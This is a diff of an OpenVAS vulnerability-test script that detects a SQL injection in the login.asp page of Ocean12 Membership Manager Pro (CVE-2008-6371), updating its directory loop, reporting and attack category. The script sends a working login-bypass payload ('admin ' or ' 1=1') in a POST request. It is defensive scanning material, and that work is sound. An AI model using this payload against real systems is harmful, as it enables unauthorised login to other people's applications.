@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: ocean12_sql_injection.nasl 5002 2017-01-13 10:17:13Z teissa $
+# $Id: ocean12_sql_injection.nasl 5771 2017-03-29 15:14:22Z cfi $
 #
 # Ocean12 Membership Manager Pro 'login.asp' SQL Injection
 # Vulnerability
@@ -25,20 +25,18 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.100037");
- script_version("$Revision: 5002 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-13 11:17:13 +0100 (Fri, 13 Jan 2017) $");
+ script_version("$Revision: 5771 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 17:14:22 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2008-6371");
  script_bugtraq_id(32508);
-
  script_name("Ocean12 Membership Manager Pro 'login.asp' SQL Injection Vulnerability");
-
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -61,41 +59,36 @@ include("http_keepalive.inc");
 port = get_http_port(default:80);
 if(!can_host_asp(port:port))exit(0);
 
-host = http_host_name( port:port );
+foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
-dirs = make_list(cgi_dirs());
+  if( dir == "/" ) dir = "";
+  url = dir + "/default.asp";
+  buf = http_get_cache(item:url, port:port);
+  if( buf == NULL )continue;
 
-foreach dir (dirs) {
+  if( egrep(pattern: "<title>Ocean12 Membership Manager Pro</title>", string: buf) &&
+      egrep(pattern: '<form method="post" action="login.asp">', string: buf)) {
 
-    url = string(dir, "/default.asp");
-    req = http_get(item:url, port:port);
-    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
-    if( buf == NULL )continue;
+    host = http_host_name( port:port );
+    variables = string("Username=admin ' or ' 1=1&Password=x");
+    url = string(dir + "/login.asp");
 
-    if(
-       egrep(pattern: "<title>Ocean12 Membership Manager Pro</title>", string: buf) &&
-       egrep(pattern: '<form method="post" action="login.asp">', string: buf)) {
+    req = string(
+      "POST ", url, " HTTP/1.0\r\n", 
+      "Referer: ","http://", host, url, "\r\n",
+      "Host: ", host, "\r\n", 
+      "Content-Type: application/x-www-form-urlencoded\r\n", 
+      "Content-Length: ", strlen(variables), 
+      "\r\n\r\n", 
+      variables );
+    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-	    variables = string("Username=admin ' or ' 1=1&Password=x");
-	    filename = string(dir + "/login.asp");
-
-	    req = string(
-	      "POST ", filename, " HTTP/1.0\r\n", 
-	      "Referer: ","http://", host, filename, "\r\n",
-	      "Host: ", host, "\r\n", 
-	      "Content-Type: application/x-www-form-urlencoded\r\n", 
-	      "Content-Length: ", strlen(variables), 
-	      "\r\n\r\n", 
-	      variables
-	    );
-
-	    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-	    if(egrep(pattern: "Location: main.asp", string: result)) {
-	         security_message(port:port);
-	         exit(0);
-	     }
+    if(egrep(pattern: "Location: main.asp", string: res)) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
+  }
 }
 
-exit(99);
+exit( 99 );
